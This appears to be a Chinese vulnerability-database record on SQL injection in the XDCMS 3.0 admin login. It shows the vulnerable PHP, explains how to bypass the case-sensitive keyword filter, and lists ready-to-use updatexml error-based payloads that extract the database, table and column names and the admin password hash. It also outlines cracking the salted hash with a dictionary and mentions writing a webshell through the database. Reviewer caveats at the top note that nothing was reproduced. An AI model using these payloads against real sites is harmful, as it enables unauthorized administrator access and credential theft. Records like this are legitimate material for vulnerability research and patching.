---
source: "hatch 补库批 20260928"
product: "XDCMS3.0"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "XDCMS 3.0 后台登录窗sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：validcaptcha/session beforequery; MySQLupdatexmlpresent; legacyPHPENT_COMPAT; DBaccountpermissions"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-9b1028d08300af7d244b9498"
entity_id: "ve-9b1028d08300af7d244b9498"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：validcaptcha/session beforequery; MySQLupdatexmlpresent; legacyPHPENT_COMPAT; DBaccountpermissions

- **适用与权限边界（1）**：验证码校验先于SQL，固定verifycode3bdd不能复用且未给session，匿名登录入口仍需验证码前提。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（2）**：无法破解hash说法过强，后文已给encrypt字典破解；应称非直接单MD5/未破解。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：secure_file_priv被禁用歧义，空值通常允许任意文件目录而NULL禁用，要记录实际值。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（4）**：源码关键链和多个payload完整有价值；默认htmlspecialchars历史版本应限定PHP，updatexml仅某MySQL版本。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（5）**：提到双写绕过但未展示递归/单次替换差异；无原始源/修复。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# XDCMS 3.0 后台登录窗sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

XDCMS 3.0

三、复现过程
------------

漏洞链

    system/modules/xdcms/login.php
    public function check(){
            
            $username = safe_html($_POST['username']);
            $password = safe_html($_POST['password']);
            $verifycode = safe_html($_POST['verifycode']);

            if(empty($username)||empty($password)){
                showmsg(C('user_pass_empty'),'-1');
            }
            
            if($verifycode!=$_SESSION['code']){
                showmsg(C('verifycode_error'),'-1');
            }
            
            $sql="select * from ".DB_PRE."admin where `username`='$username'";
            if($this->mysql->num_rows($sql)==0){
                showmsg(C('user_not_exist'),'-1');
            }
            
            $rs=$this->mysql->get_one($sql);
            $password=password($password,$rs['encrypt']);
            if($password!=$rs['password']){
                showmsg(C('password_error'),'-1');
            }
            
            if($rs['is_lock']==1){
                showmsg(C('user_lock'),'-1');
            }
            
            $logins=$rs["logins"]+1;
            $ip=safe_replace(safe_html(getip()));
            $this->mysql->db_update("admin","`last_ip`='".$ip."',`last_time`=".datetime().",`logins`=".$logins,"`username`='$username'");
            
            $_SESSION['admin']=$rs['username'];
            $_SESSION['admin_id']=$rs['id'];
            $_SESSION['groupid']=$rs['groupid'];
            unset($rs);
            showmsg(C("login_success"),"index.php?m=xdcms&c=index");
        }
    safe_html()
    function safe_html($str){
        if(empty($str)){return;}
        $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file
    |outfile/','',$str);
        return htmlspecialchars($str);
    }

safe\_html()使用preg\_replace()时候，pattern未添加/i修饰符，导致过滤字符可通过大小写转换或双写进行绕过；

同时，htmlspecialchars()未添加参数，默认仅对双引号进行转义

**payload**

    #爆库
    username=admin%27+OR+UPDATExml(1,concat('~',(database())),0)--+&password=123&verifycode=3bdd&button=
    #爆表名
    username=admin%27+OR+UPDATExml(1,concat('~',(SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+'xdcms')),0)--+&password=123&verifycode=3bdd&button=
    //updatexml一次显示32位字符，需要偏转
    username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+'xdcms'),30,30)),0)--+&password=123&verifycode=3bdd&button=
    #爆表名
    username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(column_name)+frOm+information_scheMA.columns+whEre+table_name+like+'c_admin'),1,32)),0)--+&password=123&verifycode=3bdd&button=
    #爆内容
    username=admin%27+OR+UPDATExml(1,concat(0x7e,(selEct+password+From+c_admin)),0)--+&password=123&verifycode=3bdd&button=

![](./.resource/XDCMS3.0后台登录窗sql注入漏洞/media/rId24.jpg)

虽然获取密码hash值，但cms并未直接通过MD5获得哈希值，且无法破解该哈希值；

通过SQL注入获取到账户encrypt，再使用密码字典，依次爆破来猜测明文密码；另外可通过数据库写shell，但此时`secure_file_priv`被禁用

    function password($password, $encrypt='') {
        $pwd = array();
        $pwd['encrypt'] =  $encrypt ? $encrypt : get_random();
        $password_md5=md5(trim($password));
        $nums=strlen($password_md5) - strlen($pwd['encrypt']);//encrypt:lr24vx2
        $pwd['password'] = md5(substr_replace($password_md5,$pwd['encrypt'],$nums));
        return $encrypt ? $pwd['password'] : $pwd;
    }
